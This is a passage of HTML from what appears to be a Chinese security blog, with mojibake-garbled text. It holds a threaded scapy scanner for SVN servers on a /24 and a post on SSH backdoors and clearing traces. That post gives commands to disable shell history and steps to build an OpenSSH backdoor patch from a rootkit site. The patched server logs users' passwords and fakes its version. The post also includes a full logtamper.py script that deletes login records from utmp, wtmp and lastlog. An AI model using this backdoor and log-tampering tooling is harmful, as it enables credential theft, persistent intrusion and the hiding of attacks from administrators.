    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>ç„¶åæ˜¯ä½¿ç”¨äº†<code>scapy</code>çš„<code>syn</code>æ‰«æï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> logging
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#å…³é—­import scapyçš„è­¦å‘Š</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading

conf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#å…³é—­è¾“å‡º</span>
targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>
            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> target

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>====2017-12-15æ›´æ–°</p>
<p>å…³äºå¤šçº¿ç¨‹ï¼Œä¸Šé¢ä¸¤ä¸ªçš„<code>q.join</code>å†™é”™äº†ï¼Œåˆ æ‰ä¹‹åæ”¹ä¸º:</p>
<pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰«æ<code>/24</code>çš„ä¸»æœºï¼ŒèŠ±è´¹çš„æ—¶é—´ä»8så˜ä¸ºäº†0.5sï¼Œæ—¶é—´ä¸æ˜¯è¿™ä¹ˆè®¡ç®—çš„ã€‚</p>
<p>å¦‚æœä¸Šé¢æ²¡æœ‰è®¾ç½®çº¿ç¨‹çš„daemonï¼Œæœ€åè¿è¡Œçš„æ—¶å€™ä¼šä¸€ç›´å¡ç€ï¼Œå› ä¸ºè¿›ç¨‹é»˜è®¤ä¸ä¼šåœçš„ï¼Œè¦è¿™æ ·:</p>
	
	</div>
  <a type="button" href="/2016/04/15/svn-scan.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/04/13/clear-ssh-history.html" >SSHåé—¨å’Œæ¸…é™¤ç—•è¿¹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-04-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>å¯¹äºSSHæ¥è¯´ï¼Œç™»å½•ä¸»æœºä¹‹åå…ˆæ‰§è¡Œï¼š<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p>
<p>ç„¶åæ˜¯SSHç•™åé—¨çš„æ–¹æ³•<a target="_blank" rel="noopener" href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>ç®€å•æ¥è¯´å°±æ˜¯ä»¥ä¸‹çš„ä»£ç ï¼š</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-devel
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   
<span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   
<span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   
<span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   
patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  åé—¨
æ‰§è¡Œvi includes.h

+<span class="token comment">#define ILOG "/tmp/ilog" //è®°å½•ç™»å½•åˆ°æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç </span>
+<span class="token comment">#define OLOG "/tmp/olog" //è®°å½•æœ¬æœºç™»å½•åˆ°è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç </span>
+<span class="token comment">#define SECRETPW "123456654321" //ä½ åé—¨çš„å¯†ç </span>

æ‰§è¡Œvi version.h

<span class="token comment">#define SSH_VERSION "å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬"</span>
<span class="token comment">#define SSH_PORTABLE "å°ç‰ˆæœ¬å·"</span>
./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> 
<span class="token function">service</span> sshd restart //é‡å¯sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
<p>æ¥ä¸‹æ¥åˆ é™¤ç™»å½•çš„å†å²è®°å½•ï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>ä»£ç å¤åˆ¶è¿‡æ¥ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span>
<span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys
<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam
<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser
 
UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>
WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>
LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span>
 
LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>
LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span>
 
XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>
XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
    xtmp <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
 
            data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> xtmp
 
 
<span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>
 
    timestamp <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>
        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>
 
    data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
 
 
<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> msg
    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>
    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \
        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'
    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE
 
            <span class="token comment"># tamper</span>
            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>
 
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>====<br>æ›´æ–°ï¼š</p>
<p>ä¸Šé¢çš„å¯ä»¥åœ¨debainç³»ä½¿ç”¨ï¼Œæ„Ÿè§‰ä¸‹é¢è¿™ç§æ–¹æ³•æ›´é€šç”¨ï¼š<br>æœ‰ä¸¤ç§æ–¹å¼:</p>
<ol>
<li>ä¿®æ”¹<code>/etc/ssh/ssh_config</code>æˆ–è€… <code>~/.ssh/config</code> é…ç½®æ–‡ä»¶:</li>
</ol>
<p>Host *</p>
	

	</div>
  <a type="button" href="/2016/04/13/clear-ssh-history.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>å¯¹äºSSHæ¥è¯´ï¼Œç™»å½•ä¸»æœºä¹‹åå…ˆæ‰§è¡Œï¼š<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p>
<p>ç„¶åæ˜¯SSHç•™åé—¨çš„æ–¹æ³•<a target="_blank" rel="noopener" href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>ç®€å•æ¥è¯´å°±æ˜¯ä»¥ä¸‹çš„ä»£ç ï¼š</p>
